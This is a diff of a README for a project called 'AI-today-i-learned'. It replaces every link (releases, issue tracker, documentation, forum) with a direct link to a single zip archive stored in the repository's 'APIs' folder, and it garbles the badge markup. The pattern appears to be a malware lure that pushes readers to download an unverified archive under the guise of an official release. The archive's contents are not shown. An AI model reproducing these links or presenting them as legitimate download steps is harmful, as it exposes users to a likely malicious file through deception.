@@ -1,6 +1,6 @@
 # 🌟 AI-today-i-learned - Discover Daily Learning Insights
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/aseemanchalan/AI-today-i-learned/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)
 
 ## 📚 About This Project
 
@@ -12,7 +12,7 @@ To begin using AI-today-i-learned, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to access the Releases page, where you can find the latest download options.
    
-   [Visit Releases Page to Download](https://github.com/aseemanchalan/AI-today-i-learned/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)
 
 2. **Choose the Right File:** On the Releases page, look for the latest version. You will see various files available for download. Select the one that suits your operating system.
 
@@ -27,7 +27,7 @@ To begin using AI-today-i-learned, follow these simple steps:
 
 To download and install AI-today-i-learned, please follow these steps closely:
 
-- **Step 1:** Click here to [Download from Releases](https://github.com/aseemanchalan/AI-today-i-learned/releases).
+- **Step 1:** Click here to [Download from Releases](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip).
 
 - **Step 2:** Follow the instructions specific to your operating system from the "Getting Started" section. 
 
@@ -54,11 +54,11 @@ Before downloading AI-today-i-learned, ensure your system meets the following mi
 
 If you encounter issues or have questions, feel free to reach out. Join our community forum or report issues through GitHub:
 
-- **GitHub Issues:** [Report Issues](https://github.com/aseemanchalan/AI-today-i-learned/issues)
+- **GitHub Issues:** [Report Issues](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/aseemanchalan/AI-today-i-learned/wiki)
-- [Community Forum](https://community.example.com)
+- [Documentation](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/aseemanchalan/AI-today-i-learned/main/APIs/today_A_learned_i_2.8-alpha.4.zip)
 
 Thank you for your interest in AI-today-i-learned. We hope you find valuable insights every day!
